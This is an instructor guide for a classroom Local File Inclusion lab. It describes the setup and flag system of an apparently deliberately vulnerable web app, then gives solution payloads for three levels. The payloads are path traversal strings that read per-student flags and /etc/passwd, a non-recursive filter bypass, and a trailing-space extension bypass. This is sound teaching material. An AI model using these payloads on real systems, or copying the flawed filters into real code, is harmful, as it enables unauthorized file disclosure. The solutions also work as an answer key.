# LFI Lab Instructor Guide

This lab is designed for 30+ students to learn Local File Inclusion (LFI).
Flags are unique per student and generated upon registration with a Student ID.

## Setup
1. Ensure \`node\` and \`npm\` are installed.
2. Run \`npm install\` to install dependencies (\`express\`, \`cookie-parser\`).
3. Start the server: \`node app.js\`.

## Features
- **Dynamic Flag Generation**: Each Student ID gets its own set of 3 flags.
- **Persistent Progress**: Flags are saved in \`userdata/{StudentId}/flags.json\`.
- **Flag Submission**: A dedicated page for students to submit and verify flags.
- **Solve Logging**: Successful solves are logged in \`submission_logs/solves.log\`.

## Vulnerabilities & Solutions

### Level 1: Simple LFI
- **Vulnerability**: No path validation.
- **Solution**: \`/view-doc?file=../userdata/{STUDENT_ID}/flag1.txt\`
- **Alternative**: \`/view-doc?file=../../../../etc/passwd\`

### Level 2: Filter Bypass
- **Vulnerability**: Non-recursive filter (\`replace('../', '')\`).
- **Solution**: \`/view-img?file=....//....//userdata/{STUDENT_ID}/flag2.txt\`
- **Explanation**: The filter replaces \`../\` with an empty string once. So \`....//\` becomes \`../\`.

### Level 3: Extension Bypass
- **Vulnerability**: Flawed extension check and processing.
- **Solution**: \`/fetch-avatar?src=../userdata/{STUDENT_ID}/flag3.txt .png\` (with a space before \`.png\`).
- **Explanation**: The app checks if the file ends with \`.png\`. Then it strips \`.png\` and **trims** the remaining string. By adding a space, the extension check passes, but the trim removes the space, leaving the actual file path.
- **Also works**: \`/fetch-avatar?src=../../../../etc/passwd .png\`

## Student Instructions
1. Navigate to the lab URL.
2. Enter your Student ID (e.g., S12345).
3. Find the three flags hidden in your personal user directory.
4. Submit the flags via the "Submit Flags" page.
